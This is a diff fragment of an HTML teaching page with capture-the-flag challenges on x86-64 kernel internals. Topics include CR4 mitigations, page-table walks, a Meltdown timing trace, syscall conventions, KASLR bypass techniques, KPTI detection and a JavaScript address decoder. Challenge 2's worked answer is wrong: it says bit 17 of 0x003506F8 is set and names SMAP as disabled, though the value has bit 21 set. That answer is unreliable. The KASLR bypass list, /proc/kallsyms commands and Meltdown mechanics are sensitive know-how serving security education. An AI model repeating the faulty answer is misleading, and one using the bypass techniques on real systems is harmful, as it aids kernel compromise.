+//   Bit 17 (PCIDE):  (0x003506F8 >> 17) &amp; 1 = 1  ✓ Enabled
+//   Bit 11 (UMIP):   (0x003506F8 >> 11) &amp; 1 = 0  ✗ DISABLED
+//   Bit 22 (PKE):    (0x003506F8 >> 22) &amp; 1 = 0  ✗ DISABLED
+//
+// Which disabled mitigation is critical for kernel exploitation?</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>SMAP (Supervisor Mode Access Prevention, CR4 bit 21) prevents kernel code from reading/writing user-mode pages. Without SMAP, a kernel vulnerability can be exploited by placing malicious data structures in user-mode memory and having the kernel dereference them. <code>FLAG{SMAP}</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Page Table Forensics</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Given a physical memory dump and a CR3 value (<code>0x1A3000</code>), manually walk the page tables to translate virtual address <code>0x00007FFE12345678</code> to its physical address. Flag format: <code>FLAG{physical_address_hex}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Virtual address: 0x00007FFE12345678
+// Break into page table indices:
+//   PML4 index  = (VA >> 39) &amp; 0x1FF = bits 47:39
+//   PDPT index  = (VA >> 30) &amp; 0x1FF = bits 38:30
+//   PD index    = (VA >> 21) &amp; 0x1FF = bits 29:21
+//   PT index    = (VA >> 12) &amp; 0x1FF = bits 20:12
+//   Page offset = VA &amp; 0xFFF          = bits 11:0
+//
+// Walk:
+// 1. Read PML4E at phys CR3 + (PML4_idx * 8)
+// 2. Extract PFN from PML4E → read PDPTE
+// 3. Extract PFN from PDPTE → read PDE
+// 4. Extract PFN from PDE → read PTE
+// 5. Extract PFN from PTE → physical = PFN + page_offset</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>For <code>0x00007FFE12345678</code>: PML4 idx = 0xFF (255), PDPT idx = 0x1F8, PD idx = 0x091, PT idx = 0x145, offset = 0x678. Read the 8-byte entry at each level, mask bits 51:12 to get the next physical base, add the next index * 8. Use Volatility or a hex editor on the dump to read physical memory.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Meltdown Side-Channel</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Explain the Meltdown (CVE-2017-5754) attack: how speculative execution bypasses privilege checks to leak kernel memory from user mode. Given a cache timing trace, determine which byte was speculatively accessed.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Cache timing results (access time in cycles):
+// probe[0x00 * 4096]: 280 cycles
+// probe[0x01 * 4096]: 275 cycles
+// ...
+// probe[0x41 * 4096]:  45 cycles  ← CACHE HIT!
+// probe[0x42 * 4096]: 290 cycles
+// ...
+// 
+// 0x41 = 'A' → the kernel byte at that address was 0x41
+// FLAG{0x41}
+//
+// Mitigation: KPTI/KVA Shadow removes kernel mappings from user page tables</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Meltdown exploits the gap between speculative execution and privilege checking. The CPU speculatively reads the kernel byte <em>before</em> the permission check completes. The speculative load of <code>probe[secret * 4096]</code> brings one cache line into L1. After the fault, measure access time to all 256 probe pages — the fast one (cache hit, ~45 cycles vs ~280) reveals the secret. KPTI fixes this by unmapping kernel pages from user-mode page tables entirely.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Identify the Syscall Convention</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Given a disassembly snippet from ntdll.dll and a Linux binary, identify the syscall calling convention for each OS. Flag: the register that holds the syscall number on Linux x86-64.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; Windows (ntdll!NtCreateFile):
+  mov r10, rcx       ; save rcx (clobbered by syscall)
+  mov eax, 0x55      ; SSN in EAX
+  syscall
+  ret
+
+; Linux (write syscall):
+  mov eax, 1         ; syscall number in EAX
+  mov edi, 1         ; arg1: fd = stdout
+  lea rsi, [msg]     ; arg2: buffer
+  mov edx, 13        ; arg3: length
+  syscall
+
+; Questions:
+; 1. Which register holds the syscall number on both OSes?
+; 2. Why does Windows use r10 instead of rcx for the first arg?
+; 3. What does the 'syscall' instruction use rcx for?
+; FLAG{register_name}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Both use EAX/RAX for the syscall number. On Linux, arguments go in rdi, rsi, rdx, r10, r8, r9. On Windows, arguments go in rcx, rdx, r8, r9 (but rcx is moved to r10 first). The reason: <code>syscall</code> instruction saves the return address in RCX and RFLAGS in R11 — so RCX is clobbered. Windows compensates by using R10 for the first argument. <code>FLAG{eax}</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: GDT Segment Decode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Given a raw GDT entry <code>0x00AF9B000000FFFF</code>, decode the segment descriptor fields: base, limit, type, DPL, and granularity. Flag: <code>FLAG{type_DPL}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// GDT entry: 0x00AF9B000000FFFF
+//
+// 64-bit segment descriptor layout (8 bytes):
+//   Bits 0-15:  Limit [15:0]  = 0xFFFF
+//   Bits 16-31: Base [15:0]   = 0x0000
+//   Bits 32-39: Base [23:16]  = 0x00
+//   Bits 40-43: Type          = 0xB (1011)
+//   Bit 44:     S (System)    = 1 (code/data segment)
+//   Bits 45-46: DPL           = 0x0 (Ring 0)
+//   Bit 47:     P (Present)   = 1
+//   Bits 48-51: Limit [19:16] = 0xF
+//   Bit 52:     AVL           = 0
+//   Bit 53:     L (Long mode) = 1 (64-bit code segment)
+//   Bit 54:     D/B           = 0
+//   Bit 55:     G (Granularity)= 1 (4K pages)
+//   Bits 56-63: Base [31:24]  = 0x00
+//
+// Type 0xB = Execute/Read, Accessed. DPL 0 = Ring 0.
+// This is a 64-bit kernel code segment.
+// FLAG{ExecuteRead_Ring0}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Type field bits: bit 3 = code (1=code, 0=data), bit 2 = conforming, bit 1 = readable (for code) or writable (for data), bit 0 = accessed. Type 0xB (1011) = code segment, non-conforming, readable, accessed. DPL 0 = kernel privilege. The L bit = 1 confirms this is a 64-bit (long mode) code segment. This is typically the kernel CS descriptor at selector 0x10.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Kernel ASLR Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Given that KASLR randomizes the kernel base address, identify three different information leak techniques that can defeat it. Flag: the most reliable technique on modern Linux.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Known KASLR bypass techniques:
+# 1. /proc/kallsyms (requires root, or CAP_SYSLOG since 5.x)
+# 2. dmesg output (contains kernel pointers if kptr_restrict=0)
+# 3. Side-channel (Prefetch/TSX timing to distinguish mapped vs unmapped)
+# 4. Uninitialized kernel stack/heap leaks via syscalls
+# 5. /sys/kernel/notes (ELF notes with build-id, no direct addr)
+#
+# Check your system:
+cat /proc/sys/kernel/kptr_restrict
+# 0 = exposed, 1 = hidden for non-root, 2 = hidden for all
+cat /proc/kallsyms | head -3
+# Shows 0000000000000000 if restricted
+
+# FLAG{most_reliable_modern_technique}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>On modern kernels (5.x+): /proc/kallsyms requires CAP_SYSLOG, dmesg requires CAP_SYSLOG, kptr_restrict defaults to 1+. The most reliable unprivileged technique is a side-channel: use prefetch instruction timing or TSX-based probing to determine if a virtual address is mapped. EntryBleed (CVE-2022-4543) leaked KASLR via prefetch timing on the syscall entry point. For privileged users, reading <code>/proc/kallsyms</code> remains the simplest method.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Identify the CPU Vulnerability</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Given <code>/proc/cpuinfo</code> output showing <code>bugs: spectre_v1 spectre_v2 meltdown spec_store_bypass</code>, identify which specific Intel microarchitectural vulnerability each refers to and its CVE.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">cat /proc/cpuinfo | grep bugs
+# bugs: spectre_v1 spectre_v2 meltdown spec_store_bypass l1tf mds swapgs itlb_multihit
+
+# Match each to its CVE and attack:
+# spectre_v1     → CVE-????-???? → Bounds Check Bypass
+# spectre_v2     → CVE-????-???? → Branch Target Injection  
+# meltdown       → CVE-????-???? → Rogue Data Cache Load
+# spec_store_bypass → CVE-????-???? → Speculative Store Bypass
+# l1tf           → CVE-????-???? → L1 Terminal Fault
+# mds            → CVE-????-???? → Microarchitectural Data Sampling
+
+# FLAG{spectre_v1_CVE}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>spectre_v1 = CVE-2017-5753 (Bounds Check Bypass), spectre_v2 = CVE-2017-5715 (Branch Target Injection), meltdown = CVE-2017-5754 (Rogue Data Cache Load), spec_store_bypass = CVE-2018-3639 (SSB/Spectre v4), l1tf = CVE-2018-3615/3620/3646 (L1 Terminal Fault / Foreshadow), mds = CVE-2018-12126/12127/12130 (MSBDS/MFBDS/MLPDS).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Detect KPTI from User Mode</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Without root access, determine if KPTI (Kernel Page Table Isolation) is active on the running kernel. Flag: the method and the result.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Method 1: Check kernel command line
+cat /proc/cmdline | grep -o 'pti=[a-z]*'
+# pti=on / pti=off / pti=auto
+
+# Method 2: Check CPU flags for PCID (used to optimize KPTI)
+grep pcid /proc/cpuinfo
+
+# Method 3: Check sysfs
+cat /sys/devices/system/cpu/vulnerabilities/meltdown
+# "Mitigation: PTI" = KPTI active
+# "Vulnerable" = no KPTI
+
+# Method 4: Timing-based detection
+# Syscalls are slower with KPTI due to CR3 switch on every transition
+# Time 1M getpid() calls: ~100ns with KPTI vs ~50ns without
+
+# FLAG{detection_method_and_status}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The most reliable unprivileged method is <code>cat /sys/devices/system/cpu/vulnerabilities/meltdown</code> — it reports "Mitigation: PTI" when KPTI is active. You can also check <code>/proc/cmdline</code> for explicit <code>pti=on/off</code>. Timing-based detection works because KPTI adds a CR3 switch (user page tables → kernel page tables) on every syscall entry/exit, adding ~5-10% overhead. With PCID (Process Context ID), TLB entries are tagged and the overhead is reduced.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Recover Flag from Memory Layout</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Given a process's <code>/proc/pid/maps</code> output and a known virtual address <code>0x7FFE42001337</code> that contains the flag, identify which mapped region it falls in and what permissions it has.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># /proc/1234/maps (excerpt):
+# 555555554000-555555556000 r-xp  /target_binary
+# 555555756000-555555757000 rw-p  /target_binary
+# 7f4e12000000-7f4e12021000 rw-p  [heap-adjacent]
+# 7ffe42000000-7ffe42002000 r--p  [vvar]
+# 7ffe42002000-7ffe42004000 r-xp  [vdso]
+# 7ffe42800000-7ffe44800000 rw-p  [stack]
+#
+# Address 0x7FFE42001337 falls in which region?
+# What are its permissions? Can you write to it?
+# FLAG{region_name_permissions}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>0x7FFE42001337 is between 0x7FFE42000000 and 0x7FFE42002000 → <code>[vvar]</code> region. Permissions are <code>r--p</code> (read-only, private). The vvar page is a kernel-mapped read-only page containing frequently accessed data (like <code>clock_gettime</code> data) to avoid syscall overhead. You cannot write to it from user mode. <code>FLAG{vvar_r--p}</code>.</p>
+          </div>
+        </div>
+      </div>
+      </div>
+
+      <script>
+// Virtual Address Decoder
+document.addEventListener('DOMContentLoaded', function() {
+  const vaInput = document.getElementById('vaInput');
+  if (!vaInput) return;
+  vaInput.addEventListener('input', function() {
+    let raw = vaInput.value.trim().replace(/^0x/i, '');
+    if (!raw || !/^[0-9a-fA-F]+$/.test(raw)) {
+      ['vaCanonical','vaPML4','vaPDPT','vaPD','vaPT','vaOffset'].forEach(id => {
+        const el = document.getElementById(id); if(el) el.textContent = '\u2014';
+      });
+      ['vaSignBits','vaPML4Bits','vaPDPTBits','vaPDBits','vaPTBits','vaOffBits'].forEach(id => {
+        const el = document.getElementById(id); if(el) el.textContent = '\u2014';
+      });
+      return;
+    }
+    raw = raw.padStart(16, '0');
+    const hi = parseInt(raw.substring(0, 8), 16);
+    const lo = parseInt(raw.substring(8, 16), 16);
+    const bit47 = (hi >> 15) & 1;
+    const signExt = (hi >> 16) & 0xFFFF;
+    const canonical = bit47 ? signExt === 0xFFFF : signExt === 0;
+    const pml4 = ((hi >> 7) & 0x1FF);
+    const pdpt = (((hi & 0x7F) << 2) | ((lo >>> 30) & 0x3)) & 0x1FF;
+    const pd = (lo >>> 21) & 0x1FF;
+    const pt = (lo >>> 12) & 0x1FF;
+    const offset = lo & 0xFFF;
+    document.getElementById('vaCanonical').textContent = canonical ? '\u2713 Yes' : '\u2717 Non-canonical!';
+    document.getElementById('vaCanonical').style.color = canonical ? '#4CAF50' : '#f44336';
+    document.getElementById('vaPML4').textContent = pml4 + ' (0x' + pml4.toString(16).toUpperCase() + ')';
+    document.getElementById('vaPDPT').textContent = pdpt + ' (0x' + pdpt.toString(16).toUpperCase() + ')';
+    document.getElementById('vaPD').textContent = pd + ' (0x' + pd.toString(16).toUpperCase() + ')';
+    document.getElementById('vaPT').textContent = pt + ' (0x' + pt.toString(16).toUpperCase() + ')';
+    document.getElementById('vaOffset').textContent = '0x' + offset.toString(16).toUpperCase().padStart(3,'0');
+    const bin = (hi >>> 0).toString(2).padStart(32,'0') + (lo >>> 0).toString(2).padStart(32,'0');
+    document.getElementById('vaSignBits').textContent = bin.substring(0, 16);
+    document.getElementById('vaPML4Bits').textContent = bin.substring(16, 25);
+    document.getElementById('vaPDPTBits').textContent = bin.substring(25, 34);
+    document.getElementById('vaPDBits').textContent = bin.substring(34, 43);
+    document.getElementById('vaPTBits').textContent = bin.substring(43, 52);
+    document.getElementById('vaOffBits').textContent = bin.substring(52, 64);
+  });
+});
+      </script>
+
     </div>
   </body>
 </html>
